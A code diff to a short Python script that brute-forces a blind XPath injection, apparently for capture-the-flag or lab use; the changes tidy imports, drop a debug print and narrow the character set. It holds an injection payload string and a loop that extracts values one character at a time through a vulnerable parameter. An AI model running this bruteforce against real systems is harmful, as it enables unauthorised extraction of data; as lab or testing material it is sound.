@@ -1,6 +1,6 @@
 import requests
 
-from string import *
+from string import ascii_letters, digits
 
 # short basic script to bruteforce a blindXPathInjection
 # when trying to discover the schema name, wrap the path with the name() function
@@ -15,8 +15,6 @@ PARAM_TO_INJECT = "username" # change to your vulnerable param
 TEST_QUERY = f"invalid' or string-length(name(/*[1])) = 1 and '1'='1"
 
 characters = ascii_letters + digits + "{}_"
-
-print(characters)
 
 #space to draw your schema :)
 '''
@@ -69,7 +67,7 @@ def bruteforce_value():
     value_length = find_len()
     value = ""
     while len(value) < value_length: 
-        for c in printable:
+        for c in characters:
             current_value = value + c
             print(f"Trying {current_value}")
             inject_data = DATA.copy()
